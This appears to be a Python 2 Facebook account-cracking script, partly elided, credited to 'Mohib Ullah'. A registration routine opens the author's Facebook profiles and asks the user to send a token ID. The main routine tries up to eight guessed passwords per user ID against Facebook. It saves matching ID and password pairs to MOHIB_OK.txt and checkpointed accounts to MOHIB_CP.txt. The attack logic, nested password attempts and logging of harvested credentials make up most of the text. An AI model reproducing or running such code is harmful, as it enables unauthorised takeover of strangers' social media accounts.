...
__author__ = 'Muhammad Shahab'
__copyright = 'All rights reserved . Copyright  Mohib Ullah'
...
def reg():
    ...
    try:
        to = open('/sdcard/.mohib.txt', 'r').read()
    ...
    if to in r:
        ...
        print ''
        print ' \033[1;92mCopy token id and send to Mohib Ullah'
        print ''
        print ' \033[1;92mYour id: ' + to
        print ''
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/shumaila.javed.357')
        reg()
...
def reg2():
    ...
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On https://www.facebook.com/shumaila.javed.357'
    print ''
    ...
    os.system('xdg-open https://www.facebook.com/fb.king.shahabo.Dxdx')
    sav = open('/sdcard/.mohib.txt', 'w')
    sav.write(id)
    sav.close()
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.mohib.txt', 'r').read()
    print ''
...
def a_s():
    ...
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mMOHIB ULLAH KING OF FACEBOOK\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass1
                cp = open('MOHIB_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass2
                    cp = open('MOHIB_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass3
                        cp = open('MOHIB_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass4
                            cp = open('MOHIB_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass5
                                cp = open('MOHIB_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass6
                                    cp = open('MOHIB_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass7
                                        cp = open('MOHIB_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[MOHIB-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/MOHIB_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[MOHIB-CP] ' + uid + ' | ' + pass8
                                            cp = open('MOHIB_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
